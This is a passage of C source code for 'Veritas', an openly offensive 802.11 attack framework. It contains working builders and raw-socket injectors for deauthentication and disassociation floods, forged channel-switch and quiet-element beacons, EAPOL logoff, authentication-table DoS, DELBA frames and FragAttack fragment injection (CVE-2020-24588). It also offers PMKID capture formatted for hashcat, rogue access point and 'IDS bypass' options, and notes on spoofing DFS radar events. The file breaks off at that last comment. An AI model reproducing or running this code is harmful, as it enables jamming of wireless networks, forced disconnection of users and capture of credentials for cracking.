/*
 * Veritas v4.1 — CSA Attack Framework (Audit-Fixed Edition)
 *
 * All fixes from v4.0 audit applied:
 *   [FIX 2]  PMKID KDE offset+type check (read j+6 after 0x04)
 *   [FIX 3]  Dummy vectors return empty pkt_set (no injection)
 *   [FIX 4]  TX_FLAGS = 0x0018 (NOACK|NOSEQ)
 *   [FIX 5]  EAPOL Logoff ToDS bit + correct address order
 *   [FIX 6]  DS Parameter Set IE (ID=3) in beacons/probes
 *   [FIX 7]  Quiet IE cnt=1, period=1 for continuous quiet
 *   [FIX 8]  Probe Response unicast to client MAC
 *   [FIX 9]  DELBA valid initiator params + reason
 *   [FIX 10] parse_mac return checked everywhere
 *   [FIX 11] seq=0 at factory build (injector assigns)
 *   [FIX 12] Per-thread rate_ctrl_t (no shared mutable state)
 *   [FIX 13] pthread_create return checked
 *   [FIX 14] Per-thread xorshift64 PRNG (no glibc mutex)
 *   [FIX 15] Socket failure prints error with context
 *   [FIX 16] Guard pkts.n==0 in inject_thread
 *   [FIX 17] Batch sendmmsg works for single-pkt vectors
 *   [FIX 19] PPS target divided by thread count
 *   [FIX 20] Per-thread rolling-window PPS (1s window)
 *   [FIX 21] PACKET_IGNORE_OUTGOING on capture socket
 *   [FIX 22] PMKID filtered to target BSSID only
 *   [FIX 23] EAPOL M1 validation (Key Info ACK bit)
 *   [FIX 24] Unaligned radiotap read via memcpy
 *   [FIX 25] PMKID output in hashcat 22000 format
 *   [FIX 26] PMKID/IDS/dual/rogue enabled in both modes
 *   [FIX 27] Interface switched to AP mode for rogue
 *   [FIX 28] hw_mode=a + VHT for 5GHz rogue AP
 *   [FIX 29] Blocking waitpid for rogue cleanup
 *   [FIX 30] start_rogue called in script mode
 *   [FIX 31] Script mode input validation
 *   [FIX 32] jbool() JSON boolean parser
 *   [FIX 33] set_ch via fork/execlp (no system())
 *   [FIX 34] DFS channel warnings
 *   [FIX 35] ESSID fallback uses fld[13] only when nf>=14
 *   [FIX 36] CLI flags --pmkid --ids-bypass --dual --rogue --help
 *   [FIX 37] Stats file throttled to 1Hz
 *   [FIX 38] "Hit Rate" renamed to "TX OK"
 *   [FIX 39] Both interfaces restored on exit
 *   [FIX 40] --help handler
 *   [FIX 41] htole16/le16toh for portability
 *   [FIX 42] Scanner --band option (abg)
 *   [FIX 43] Channel width in set_ch
 *   [FIX 44] hostapd VHT config for 5GHz
 *   [FIX 45] Regulatory domain warning for high 5GHz
 *   [FIX 46] DFS redirect strategy info message
 *
 * Compile: gcc -Wall -Wextra -O2 -pthread -o veritas veritas.c -lm
 * Usage:   sudo ./veritas [--help]
 *          sudo ./veritas [--pmkid] [--ids-bypass] [--dual <if2>] [--rogue]
 *          sudo ./veritas --script config.json
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <ctype.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <glob.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <math.h>
#include <net/if.h>
#include <pthread.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

/* ============================================================
 *               COLOR SYSTEM
 * ============================================================ */

#define RST "\033[0m"
#define BLD "\033[1m"
#define DIM "\033[2m"

#define C_CYAN "\033[38;5;45m"
#define C_AQUA "\033[38;5;51m"
#define C_ICE "\033[38;5;87m"
#define C_BLUE "\033[38;5;33m"
#define C_ELECTRIC "\033[38;5;81m"
#define C_WHITE "\033[38;5;255m"
#define C_GRAY "\033[38;5;244m"
#define C_DIM_GRAY "\033[38;5;236m"
#define C_GREEN "\033[38;5;83m"
#define C_YELLOW "\033[38;5;226m"
#define C_ORANGE "\033[38;5;208m"
#define C_RED "\033[38;5;196m"
#define C_DEEP_B "\033[38;5;18m"

static const char *BANNER =
    "\n" C_DEEP_B BLD
    "   ╔══════════════════════════════════════════════════════════════╗" RST
    "\n" C_BLUE BLD
    "   ║    ██╗   ██╗███████╗██████╗ ██╗████████╗ █████╗ ███████╗     ║" RST
    "\n" C_CYAN BLD
    "   ║    ██║   ██║█████╗  ██████╔╝██║   ██║   ███████║███████╗     ║" RST
    "\n" C_AQUA BLD
    "   ║     ╚████╔╝ ███████╗██║  ██║██║   ██║   ██║  ██║███████║     ║" RST
    "\n" C_ICE BLD
    "   ║      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝     ║" RST
    "\n" C_DEEP_B BLD
    "   ╠══════════════════════════════════════════════════════════════╣" RST
    "\n" C_ICE BLD
    "   ║      V E R I T A S   v 4 . 4  —  Audit-Fixed Edition       ║" RST
    "\n" C_DEEP_B BLD
    "   ╚══════════════════════════════════════════════════════════════╝" RST
    "\n";

/* ============================================================
 *               CONSTANTS
 * ============================================================ */

#define VERSION "4.4.0"
#define MAX_SSID_LEN 32
#define MAX_MAC_STR 18
#define MAX_IFACE 32
#define MAX_PATH_LEN 256
#define MAX_APS 50
#define MAX_AUTH_POOL 16
#define MAX_PKT_SIZE 512
#define MAX_FRAG_PAYLOAD 128
#define SNDBUF_SIZE (2 * 1024 * 1024)
#define BATCH_SIZE 16

/* [FIX 34] DFS channel detection */
static bool is_dfs_ch(int ch) {
  return (ch >= 52 && ch <= 64) || (ch >= 100 && ch <= 144);
}

/* ============================================================
 *               ENUMS
 * ============================================================ */

typedef enum {
  VEC_CSA_BEACON = 0,
  VEC_QUIET_ELEMENT,
  VEC_DEAUTH_FLOOD,
  VEC_DISASSOC_FLOOD,
  VEC_EAPOL_LOGOFF,
  VEC_PMKID_CAPTURE,
  VEC_AUTH_DOS,
  VEC_CSA_ACTION,
  VEC_BEACON_CONFUSION,
  VEC_PROBE_RESPONSE_CSA,
  VEC_DELBA_ATTACK,
  VEC_EVIL_TWIN,
  VEC_TKIP_MIC,
  VEC_POWER_SAVE,
  VEC_FRAGATTACK,
  VEC_DFS_FAKE_RADAR,
  VEC_COUNT
} attack_vector_t;

static const char *VEC_NAMES[] = {
    "CSA Beacon Flood",    "Quiet Element DoS", "Deauth Flood",
    "Disassoc Flood",      "EAPOL Logoff",      "PMKID Capture",
    "Auth Table DoS",      "CSA Action Frame",  "Beacon Confusion",
    "Probe Response CSA",  "DELBA Attack",      "Evil Twin Handoff",
    "TKIP/GCMP MIC Error", "Power Save DoS",    "FragAttack Injection",
    "Operating Channel Aggression",
};

typedef enum {
  MODE_STEALTH = 1,
  MODE_LOW = 2,
  MODE_MEDIUM = 3,
  MODE_HIGH = 4,
  MODE_INSANE = 5,
} attack_mode_t;

static const char *MODE_NAMES[] = {"",       "STEALTH", "LOW",
                                   "MEDIUM", "HIGH",    "INSANE"};

/* ============================================================
 *               DATA STRUCTURES
 * ============================================================ */

typedef struct {
  char bssid[MAX_MAC_STR];
  char ssid[MAX_SSID_LEN + 1];
  int channel;
  char encryption[16];
  int power;
} target_ap_t;

typedef struct {
  bool vec_on[VEC_COUNT];
  int nvec;
  attack_mode_t mode;
  char iface[MAX_IFACE];
  char iface2[MAX_IFACE];
  int duration;
  int new_ch;
  int ch_width; /* [FIX 43] 20/40/80/160 MHz */
  char client[MAX_MAC_STR];
  bool dual_radio;
  bool ids_bypass;
  bool log_pmkid;
  bool spawn_rogue;
  char rogue_ssid[MAX_SSID_LEN + 1];
  double refresh_rate;
  char stats_file[MAX_PATH_LEN];
} config_t;

typedef struct {
  char iface[MAX_IFACE];
  attack_mode_t mode;
  bool vec_on[VEC_COUNT];
  int nvec;
  bool scan_5ghz;
  int duration;
  char export_file[MAX_PATH_LEN];
} stress_cfg_t;

static void run_stress(stress_cfg_t *cfg);

/* [FIX 4] Lock-free atomic counters */
static atomic_uint_fast64_t g_pkts_sent = 0;
static atomic_uint_fast64_t g_pkts_fail = 0;
static volatile sig_atomic_t g_stop = 0;
static double g_start_time = 0;
static int g_total_threads = 0; /* [FIX 19] for rate division */

/* [FIX 14] Per-thread xorshift64 PRNG */
typedef struct {
  uint64_t s;
} xorshift64_t;

static uint64_t xs64_next(xorshift64_t *x) {
  uint64_t s = x->s;
  s ^= s << 13;
  s ^= s >> 7;
  s ^= s << 17;
  x->s = s;
  return s;
}

static int xs64_range(xorshift64_t *x, int lo, int hi) {
  if (lo >= hi)
    return lo;
  return lo + (int)(xs64_next(x) % (uint64_t)(hi - lo + 1));
}

static void xs64_seed(xorshift64_t *x) {
  int fd = open("/dev/urandom", O_RDONLY);
  if (fd >= 0) {
    if (read(fd, &x->s, 8) < 8)
      x->s = (uint64_t)time(NULL) ^ (uint64_t)pthread_self();
    close(fd);
  } else {
    x->s = (uint64_t)time(NULL) ^ (uint64_t)pthread_self();
  }
  if (x->s == 0)
    x->s = 1;
}

/* ============================================================
 *               802.11 FRAME STRUCTURES (packed)
 * ============================================================ */

typedef struct __attribute__((packed)) {
  uint8_t ver, pad;
  uint16_t len;
  uint32_t present;
  uint16_t tx_flags;
} rt_hdr_t;

typedef struct __attribute__((packed)) {
  uint16_t fc, dur;
  uint8_t a1[6], a2[6], a3[6];
  uint16_t seq;
} dot11_t;

typedef struct __attribute__((packed)) {
  uint64_t ts;
  uint16_t interval;
  uint16_t cap;
} beacon_fix_t;

typedef struct __attribute__((packed)) {
  uint8_t mode, ch, count;
} csa_ie_t;

typedef struct __attribute__((packed)) {
  uint8_t cnt, period;
  uint16_t dur, offset;
} quiet_ie_t;

typedef struct __attribute__((packed)) {
  uint8_t dsap, ssap, ctrl;
  uint8_t oui[3];
  uint16_t type;
} llc_snap_t;

typedef struct __attribute__((packed)) {
  uint8_t ver, type;
  uint16_t len;
} eapol_t;

typedef struct {
  uint8_t buf[MAX_PKT_SIZE];
  int len;
} pkt_t;

/* ============================================================
 *               UTILITIES
 * ============================================================ */

static double mono_time(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return ts.tv_sec + ts.tv_nsec * 1e-9;
}

static uint64_t mono_us(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint64_t)ts.tv_sec * 1000000ULL + (uint64_t)(ts.tv_nsec / 1000);
}

static void usleep_precise(double sec) {
  if (sec <= 0)
    return;
  struct timespec ts = {.tv_sec = (time_t)sec,
                        .tv_nsec = (long)((sec - (time_t)sec) * 1e9)};
  nanosleep(&ts, NULL);
}

static int parse_mac(const char *s, uint8_t o[6]) {
  unsigned a[6];
  if (sscanf(s, "%x:%x:%x:%x:%x:%x", &a[0], &a[1], &a[2], &a[3], &a[4],
             &a[5]) != 6) {
    if (sscanf(s, "%x-%x-%x-%x-%x-%x", &a[0], &a[1], &a[2], &a[3], &a[4],
               &a[5]) != 6)
      return -1;
  }
  for (int i = 0; i < 6; i++) {
    if (a[i] > 255)
      return -1;
    o[i] = (uint8_t)a[i];
  }
  return 0;
}

static void format_mac(const uint8_t m[6], char out[MAX_MAC_STR]) {
  snprintf(out, MAX_MAC_STR, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2],
           m[3], m[4], m[5]);
}

static bool valid_mac(const char *m) {
  if (!m || strlen(m) != 17)
    return false;
  for (int i = 0; i < 17; i++) {
    if ((i + 1) % 3 == 0) {
      if (m[i] != ':' && m[i] != '-')
        return false;
    } else {
      if (!isxdigit((unsigned char)m[i]))
        return false;
    }
  }
  return true;
}

static bool valid_ch(int c) {
  return (c >= 1 && c <= 14) || (c >= 36 && c <= 165);
}

static void rand_mac(uint8_t o[6]) {
  int fd = open("/dev/urandom", O_RDONLY);
  if (fd >= 0) {
    if (read(fd, o, 6) < 6) { /* fallback below */
    }
    close(fd);
  } else {
    for (int i = 0; i < 6; i++)
      o[i] = (uint8_t)(rand() & 0xFF);
  }
  o[0] = (o[0] & 0xFE) | 0x02;
}

static void get_term_size(int *c, int *r) {
  struct winsize w;
  if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &w) == 0) {
    *c = w.ws_col > 0 ? w.ws_col : 80;
    *r = w.ws_row > 0 ? w.ws_row : 24;
  } else {
    *c = 80;
    *r = 24;
  }
}

static void ssid_to_hex(const char *ssid, char *hex, size_t hexsz) {
  size_t sl = strlen(ssid);
  size_t i;
  for (i = 0; i < sl && (i * 2 + 2) < hexsz; i++)
    snprintf(hex + i * 2, 3, "%02x", (unsigned char)ssid[i]);
  hex[i * 2] = 0;
}

/* ============================================================
 *               RAW SOCKET ENGINE
 * ============================================================ */

static int raw_socket(const char *iface) {
  int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (s < 0) {
    fprintf(stderr, "  " C_RED "[!] socket(AF_PACKET): %s" RST "\n",
            strerror(errno));
    return -1;
  }
  int sndbuf = SNDBUF_SIZE;
  setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

  struct sockaddr_ll sll = {
      .sll_family = AF_PACKET,
      .sll_protocol = htons(ETH_P_ALL),
      .sll_ifindex = (int)if_nametoindex(iface),
  };
  if (sll.sll_ifindex == 0) {
    fprintf(stderr, "  " C_RED "[!] Interface '%s' not found" RST "\n", iface);
    close(s);
    return -1;
  }
  if (bind(s, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
    fprintf(stderr, "  " C_RED "[!] bind('%s'): %s" RST "\n", iface,
            strerror(errno));
    close(s);
    return -1;
  }
  return s;
}

static int inject_batch(int sock, pkt_t *pkts, int count) {
  struct mmsghdr msgs[BATCH_SIZE];
  struct iovec iovs[BATCH_SIZE];
  int n = count > BATCH_SIZE ? BATCH_SIZE : count;
  memset(msgs, 0, sizeof(msgs));
  for (int i = 0; i < n; i++) {
    iovs[i].iov_base = pkts[i].buf;
    iovs[i].iov_len = (size_t)pkts[i].len;
    msgs[i].msg_hdr.msg_iov = &iovs[i];
    msgs[i].msg_hdr.msg_iovlen = 1;
  }
  return (int)sendmmsg(sock, msgs, (unsigned)n, 0);
}

static int inject_one(int sock, const uint8_t *p, int len) {
  return (int)send(sock, p, (size_t)len, 0);
}

/* ============================================================
 *               FRAME BUILDERS
 * ============================================================ */

static const uint8_t BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

#define FC_BEACON 0x0080
#define FC_PROBERESP 0x0050
#define FC_AUTH 0x00B0
#define FC_DEAUTH 0x00C0
#define FC_DISASSOC 0x00A0
#define FC_ACTION 0x00D0
#define FC_DATA_TODS 0x0108 /* [FIX 5] Data frame with ToDS */

/* [FIX 4] TX_FLAGS = NOACK(0x0008) | NOSEQ(0x0010) */
static int mk_rt(uint8_t *b) {
  rt_hdr_t *h = (rt_hdr_t *)b;
  h->ver = 0;
  h->pad = 0;
  h->len = htole16(sizeof(rt_hdr_t)); /* [FIX 41] */
  h->present = htole32(1 << 15);      /* [FIX 41] */
  h->tx_flags = htole16(0x0018);      /* [FIX 4] NOACK|NOSEQ */
  return sizeof(rt_hdr_t);
}

static int mk_dot11(uint8_t *b, uint16_t fc, const uint8_t d[6],
                    const uint8_t s[6], const uint8_t bs[6], uint16_t seq) {
  dot11_t *h = (dot11_t *)b;
  h->fc = htole16(fc); /* [FIX 41] */
  h->dur = 0;
  memcpy(h->a1, d, 6);
  memcpy(h->a2, s, 6);
  memcpy(h->a3, bs, 6);
  h->seq = htole16(seq << 4); /* [FIX 41] */
  return sizeof(dot11_t);
}

/* [FIX 6] Helper: append DS Parameter Set IE */
static int mk_ds_ie(uint8_t *b, uint8_t ch) {
  b[0] = 3;
  b[1] = 1;
  b[2] = ch;
  return 3;
}

/* [FIX 6] cur_ch parameter added to all beacon/probe builders */
static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
                         uint8_t cur_ch, uint8_t new_ch) {
  (void)cur_ch;
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_BEACON, BCAST, bss, bss, 0);

  beacon_fix_t *f = (beacon_fix_t *)(b + o);
  f->ts = htole64(mono_us());
  f->interval = htole16(100);
  f->cap = htole16(0x0031);
  o += sizeof(beacon_fix_t);

  /* SSID IE */
  int sl = (int)strlen(ssid);
  if (sl > MAX_SSID_LEN)
    sl = MAX_SSID_LEN;
  b[o++] = 0;
  b[o++] = (uint8_t)sl;
  memcpy(b + o, ssid, sl);
  o += sl;

  /* DS Parameter Set IE pointing to target new_ch */
  o += mk_ds_ie(b + o, new_ch);

  /* CSA IE (ID=37, len=3) */
  b[o++] = 37;
  b[o++] = 3;
  csa_ie_t *c = (csa_ie_t *)(b + o);
  c->mode = 1;
  c->ch = new_ch;
  c->count = 1; /* Instant channel switch trigger */
  o += sizeof(csa_ie_t);
  return o;
}

static int mk_quiet_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
                           uint8_t cur_ch) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_BEACON, BCAST, bss, bss, 0);

  beacon_fix_t *f = (beacon_fix_t *)(b + o);
  f->ts = htole64(mono_us());
  f->interval = htole16(100);
  f->cap = htole16(0x0031);
  o += sizeof(beacon_fix_t);

  int sl = (int)strlen(ssid);
  if (sl > MAX_SSID_LEN)
    sl = MAX_SSID_LEN;
  b[o++] = 0;
  b[o++] = (uint8_t)sl;
  memcpy(b + o, ssid, sl);
  o += sl;

  /* [FIX 6] DS Parameter Set IE */
  o += mk_ds_ie(b + o, cur_ch);

  /* Quiet IE (ID=40, len=6) */
  b[o++] = 40;
  b[o++] = 6;
  quiet_ie_t *q = (quiet_ie_t *)(b + o);
  q->cnt = 1;              /* [FIX 7] was 0 */
  q->period = 1;           /* [FIX 7] was 0 */
  q->dur = htole16(65535); /* [FIX 41] */
  q->offset = 0;
  o += sizeof(quiet_ie_t);
  return o;
}

static int mk_deauth(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
                     uint16_t reason, uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_DEAUTH, cli, bss, bss, seq);
  uint16_t r = htole16(reason); /* [FIX 41] */
  memcpy(b + o, &r, 2);
  o += 2;
  return o;
}

static int mk_deauth_rev(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
                         uint16_t reason, uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_DEAUTH, bss, cli, bss, seq);
  uint16_t r = htole16(reason);
  memcpy(b + o, &r, 2);
  o += 2;
  return o;
}

static int mk_disassoc(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
                       uint16_t reason, uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_DISASSOC, cli, bss, bss, seq);
  uint16_t r = htole16(reason);
  memcpy(b + o, &r, 2);
  o += 2;
  return o;
}

/* [FIX 5] EAPOL Logoff with ToDS + correct address order */
static int mk_eapol_logoff(uint8_t *b, const uint8_t bss[6],
                           const uint8_t cli[6]) {
  int o = 0;
  o += mk_rt(b + o);
  /* [FIX 5] ToDS: addr1=BSSID(RA), addr2=SA(client), addr3=DA(BSSID) */
  o += mk_dot11(b + o, FC_DATA_TODS, bss, cli, bss, 0);

  llc_snap_t *l = (llc_snap_t *)(b + o);
  l->dsap = 0xAA;
  l->ssap = 0xAA;
  l->ctrl = 0x03;
  memset(l->oui, 0, 3);
  l->type = htons(0x888E);
  o += sizeof(llc_snap_t);

  eapol_t *e = (eapol_t *)(b + o);
  e->ver = 1;
  e->type = 2;
  e->len = 0;
  o += sizeof(eapol_t);
  return o;
}

static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
                         uint8_t new_ch) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
  b[o++] = 0; /* category: Spectrum Management */
  b[o++] = 4; /* action: Channel Switch Announcement */
  /* CSA IE embedded in action body (ID=37, len=3, per 802.11-2020 §9.6.2.6) */
  b[o++] = 37;
  b[o++] = 3;
  b[o++] = 1; /* switch mode */
  b[o++] = new_ch;
  b[o++] = 1; /* switch count */
  return o;
}

/* [FIX 8] Probe Response with client MAC parameter */
static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
                             const uint8_t dst[6], const char *ssid,
                             uint8_t cur_ch, uint8_t new_ch) {
  (void)cur_ch;
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_PROBERESP, dst, bss, bss, 0); /* [FIX 8] unicast */

  beacon_fix_t *f = (beacon_fix_t *)(b + o);
  f->ts = htole64(mono_us());
  f->interval = htole16(100);
  f->cap = htole16(0x0031);
  o += sizeof(beacon_fix_t);

  int sl = (int)strlen(ssid);
  if (sl > MAX_SSID_LEN)
    sl = MAX_SSID_LEN;
  b[o++] = 0;
  b[o++] = (uint8_t)sl;
  memcpy(b + o, ssid, sl);
  o += sl;

  /* DS Parameter Set IE pointing to target new_ch */
  o += mk_ds_ie(b + o, new_ch);

  b[o++] = 37;
  b[o++] = 3;
  csa_ie_t *c = (csa_ie_t *)(b + o);
  c->mode = 1;
  c->ch = new_ch;
  c->count = 1; /* Instant channel switch trigger */
  o += sizeof(csa_ie_t);
  return o;
}

static int mk_auth(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6]) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_AUTH, bss, cli, bss, 0);
  uint16_t z = 0, one = htole16(1);
  memcpy(b + o, &z, 2);
  o += 2; /* auth_algo=0 */
  memcpy(b + o, &one, 2);
  o += 2; /* auth_seq=1 */
  memcpy(b + o, &z, 2);
  o += 2; /* status=0 */
  return o;
}

/* [FIX 9] DELBA with valid initiator params */
static int mk_delba(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6]) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
  b[o++] = 3; /* category: Block Ack */
  b[o++] = 2; /* action: DELBA */
  /* [FIX 9] DELBA params: bit 11 = initiator, bits 12-15 = TID */
  uint16_t params = htole16(0x0800); /* initiator=1, TID=0 */
  memcpy(b + o, &params, 2);
  o += 2;
  uint16_t reason = htole16(39); /* Mechanism not setup */
  memcpy(b + o, &reason, 2);
  o += 2;
  return o;
}

/* [FIX 6] Confusion beacon with DS Parameter Set */
static int mk_confusion_beacon(uint8_t *b, const char *ssid, uint8_t cur_ch) {
  uint8_t fake[6];
  rand_mac(fake);
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_BEACON, BCAST, fake, fake, 0);
  beacon_fix_t *f = (beacon_fix_t *)(b + o);
  f->ts = htole64(mono_us());
  f->interval = htole16(100);
  f->cap = htole16(0x0031);
  o += sizeof(beacon_fix_t);
  int sl = (int)strlen(ssid);
  if (sl > MAX_SSID_LEN)
    sl = MAX_SSID_LEN;
  b[o++] = 0;
  b[o++] = (uint8_t)sl;
  memcpy(b + o, ssid, sl);
  o += sl;
  o += mk_ds_ie(b + o, cur_ch); /* [FIX 6] */
  return o;
}

/* ============================================================
 *  FragAttack Injection — Fragment Header Manipulation (CVE-2020-24588)
 *
 *  Splits a data frame into two fragments with manipulated headers:
 *  Fragment 0 (MoreFrag=1): LLC/SNAP header + partial ARP request
 *  Fragment 1 (MoreFrag=0): Injected payload (plaintext data)
 *
 *  The receiver reassembles fragments in RAM and processes the
 *  reconstructed frame, bypassing per-fragment encryption checks
 *  on vulnerable implementations.
 *
 *  Reference: Mathy Vanhoef, "Fragment and Forge" (USENIX 2021)
 * ============================================================ */

/* FC flags for fragmentation */
#define FC_DATA_TODS_MOREFRAG 0x0508 /* Data + ToDS + MoreFragments */

/*
 * mk_frag_setup — Fragment 0 (setup fragment, MoreFragments=1)
 *
 * Frame structure:
 *   [RadioTap] [802.11 Data ToDS+MoreFrag, frag=0] [LLC/SNAP→0x0800] [ARP
 * partial]
 *
 * The LLC/SNAP header declares IPv4 (0x0800) but the actual payload
 * is crafted to be completed by Fragment 1. Because many receivers
 * don't verify that all fragments share the same PN/encryption state,
 * Fragment 1 can inject arbitrary plaintext content.
 */
static int mk_frag_setup(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
                         uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);

  /* 802.11 header: Data frame, ToDS=1, MoreFragments=1 */
  dot11_t *h = (dot11_t *)(b + o);
  h->fc = htole16(FC_DATA_TODS_MOREFRAG);
  h->dur = 0;
  /* ToDS addressing: addr1=BSSID(RA), addr2=SA(client), addr3=DA(BSSID) */
  memcpy(h->a1, bss, 6);
  memcpy(h->a2, cli, 6);
  memcpy(h->a3, bss, 6);
  /* Sequence Control: seq_num in bits[4:15], frag_num=0 in bits[0:3] */
  h->seq = htole16((seq << 4) | 0); /* fragment 0 */
  o += sizeof(dot11_t);

  /* LLC/SNAP header declaring IPv4 (EtherType 0x0800) */
  llc_snap_t *l = (llc_snap_t *)(b + o);
  l->dsap = 0xAA;
  l->ssap = 0xAA;
  l->ctrl = 0x03;
  memset(l->oui, 0, 3);
  l->type = htons(0x0800); /* IPv4 */
  o += sizeof(llc_snap_t);

  /*
   * Partial ARP-like probe payload (first 14 bytes of an ARP request).
   * This gets combined with Fragment 1 in the receiver's reassembly buffer.
   *
   * ARP header: hw_type(2) + proto_type(2) + hw_len(1) + proto_len(1)
   *           + opcode(2) + sender_hw(6)
   */
  uint8_t arp_partial[] = {
      0x00,
      0x01, /* Hardware type: Ethernet */
      0x08,
      0x00, /* Protocol type: IPv4 */
      0x06, /* Hardware address length */
      0x04, /* Protocol address length */
      0x00,
      0x01, /* Opcode: ARP Request */
      /* Sender hardware address (spoofed as client) */
      cli[0],
      cli[1],
      cli[2],
      cli[3],
      cli[4],
      cli[5],
  };
  memcpy(b + o, arp_partial, sizeof(arp_partial));
  o += sizeof(arp_partial);

  return o;
}

/*
 * mk_frag_payload — Fragment 1 (payload fragment, MoreFragments=0)
 *
 * Frame structure:
 *   [RadioTap] [802.11 Data ToDS, frag=1] [Injected payload bytes]
 *
 * This fragment carries the "tail" of the reassembled frame.
 * Because the receiver stitches it with Fragment 0's LLC/SNAP
 * context, the combined result is processed as a valid IPv4 frame
 * with our injected content — without ever knowing the WPA key.
 *
 * The payload here is a crafted ICMP Echo Request (ping) that,
 * when reassembled, forms a valid IP packet destined to the
 * gateway, proving plaintext injection capability.
 */
static int mk_frag_payload(uint8_t *b, const uint8_t bss[6],
                           const uint8_t cli[6], uint16_t seq,
                           const uint8_t *payload, int payload_len) {
  int o = 0;
  o += mk_rt(b + o);

  /* 802.11 header: Data frame, ToDS=1, MoreFragments=0 (last frag) */
  dot11_t *h = (dot11_t *)(b + o);
  h->fc = htole16(FC_DATA_TODS); /* No MoreFrag — this is the final fragment */
  h->dur = 0;
  memcpy(h->a1, bss, 6);
  memcpy(h->a2, cli, 6);
  memcpy(h->a3, bss, 6);
  /* Same sequence number as Fragment 0, but frag_num=1 */
  h->seq = htole16((seq << 4) | 1); /* fragment 1 */
  o += sizeof(dot11_t);

  /*
   * Injected payload — completes the ARP started in Fragment 0.
   * This contains: sender_ip(4) + target_hw(6) + target_ip(4)
   * plus an ICMP echo request probe that the AP will forward.
   *
   * When the two fragments are reassembled in the victim's RAM:
   *   Fragment 0: [LLC/SNAP→IPv4] [ARP hw_type..sender_hw]
   *   Fragment 1: [sender_ip..target_ip] [ICMP probe]
   * = Complete ARP request + ICMP injection
   */
  if (payload && payload_len > 0) {
    int copy_len =
        payload_len > MAX_FRAG_PAYLOAD ? MAX_FRAG_PAYLOAD : payload_len;
    memcpy(b + o, payload, copy_len);
    o += copy_len;
  } else {
    /* Default payload: ARP completion + ICMP echo probe */
    uint8_t default_payload[] = {
        /* Sender IP: 192.168.1.100 (spoofed) */
        0xC0,
        0xA8,
        0x01,
        0x64,
        /* Target hardware address: broadcast */
        0xFF,
        0xFF,
        0xFF,
        0xFF,
        0xFF,
        0xFF,
        /* Target IP: 192.168.1.1 (gateway probe) */
        0xC0,
        0xA8,
        0x01,
        0x01,
        /* === ICMP Echo Request (injected command channel) === */
        /* IP header stub (ver=4, IHL=5, total_len, TTL=64, proto=ICMP) */
        0x45,
        0x00,
        0x00,
        0x1C, /* IPv4, 28 bytes total */
        0x00,
        0x00,
        0x40,
        0x00, /* Don't Fragment */
        0x40,
        0x01,
        0x00,
        0x00, /* TTL=64, Proto=ICMP, checksum=0 */
        0xC0,
        0xA8,
        0x01,
        0x64, /* Src: 192.168.1.100 */
        0xC0,
        0xA8,
        0x01,
        0x01, /* Dst: 192.168.1.1 */
        /* ICMP Echo Request */
        0x08,
        0x00,
        0x00,
        0x00, /* Type=8 (Echo), Code=0 */
        0xDE,
        0xAD,
        0xBE,
        0xEF, /* Identifier + Seq (marker) */
    };
    memcpy(b + o, default_payload, sizeof(default_payload));
    o += sizeof(default_payload);
  }

  return o;
}

/* ============================================================
 *  Operating Channel Aggression — DFS Fake Radar (Vector #16)
 *
 *  Spoofs IEEE 802.11h Spectrum Management signalling that
 *  mimics a military/weather radar detection event on a DFS
 *  operating channel (UNII-2 / UNII-2e: ch 52–64, 100–144).
 *
 *  Packet pair:
 *    1. Measurement Report Action (Basic Report, Map bit3=Radar)
 *       Client→AP: claims radar energy was observed on cur_ch
 *    2. CSA Beacon (mode=1 stop-TX, count=0) AP→broadcast
 *       Spoofs the AP's mandatory channel vacation response
 *
 *  Tactical effect: compliant 5 GHz APs must vacate the channel
 *  and enter Non-Occupancy / CAC lockout (minutes) per aviation
 *  DFS regulations (ETSI EN 301 893 / FCC Part 15 Subpart E).
 *
 *  Reference: IEEE 802.11-2020 §11.9 (DFS), §9.4.2.22 (Meas Report)
 * ============================================================ */

